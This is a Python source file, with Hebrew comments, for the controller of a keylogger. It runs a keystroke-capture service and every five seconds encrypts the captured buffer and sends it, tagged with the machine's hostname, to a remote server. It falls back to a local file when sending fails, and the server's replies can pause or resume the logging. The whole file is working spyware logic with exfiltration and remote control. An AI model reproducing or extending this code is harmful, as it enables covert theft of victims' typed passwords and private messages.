import json
import time
import socket

from file_writer import FileWriter
from keylogger_service import KeyLogger
from encryptor import Encryptor
from network_writer import NetworkWriter


def timer():
    time.sleep(5)


class Manager:
    def __init__(self):
        self.machine_name = socket.gethostname()
        self.file_writer = FileWriter()
        self.service = KeyLogger(self.machine_name)
        self.encryptor = Encryptor()
        self.network_writer = NetworkWriter()
        self.is_listening = True  # שם המשתנה מובן יותר

    def continue_listening(self):
        self.service.continue_listen()

    def stop_listening(self):
        self.service.stop()

    def file_write(self, data):
        """כותב את הנתונים לקובץ."""
        encrypted_data = self.encryptor.encrypt_dict(data)
        self.file_writer.send_data(encrypted_data, self.machine_name)

    def manage(self):
        self.service.start()
        while True:
            # המתנה בין כל שליחה
            timer()

            # שלב 1: מושך עותק של הנתונים מהבאפר של השירות ומנקה אותו
            data = self.service.get_and_clear_buffer()
            print(data)
            # שלב 2: מצפין את הנתונים לפני השליחה
            encrypted_data = self.encryptor.encrypt_dict(data)
            # שלב 3: מנסה לשלוח את הנתונים
            res = self.network_writer.send_data(encrypted_data, self.machine_name)

            # בדיקת התגובה מהשרת
            if res is None or res.status_code != 200 and res.status_code != 204:
                print("שליחה נכשלה או שהתגובה לא הייתה תקינה. שומר את הנתונים לקובץ.")
                self.file_write(data)
                continue  # ממשיך ללולאה הבאה

            # אם הגעת לכאן, השליחה הצליחה והתגובה תקינה (קוד 204 או 200)
            print("הנתונים נשלחו בהצלחה.")

            # שלב 4: טיפול בתוכן התגובה
            try:
                response_data = res.json()
                # בודק האם המפתח קיים
                status_listen = response_data.get('status_listen')
                if status_listen is not None:
                    if status_listen == 0:
                        print("התקבל סטטוס עצירה מהשרת.")
                        self.stop_listening()
                    else:  # אם הערך הוא 1
                        print("התקבל סטטוס המשך מהשרת.")
                        self.continue_listening()
                else:
                    print("המפתח 'status_listen' לא נמצא בתגובה.")
            except json.JSONDecodeError:
                self.file_write(data)


if __name__ == "__main__":
    manager = Manager()

    try:
        manager.manage()
    except KeyboardInterrupt:
        print("\nהמנהל הופסק.")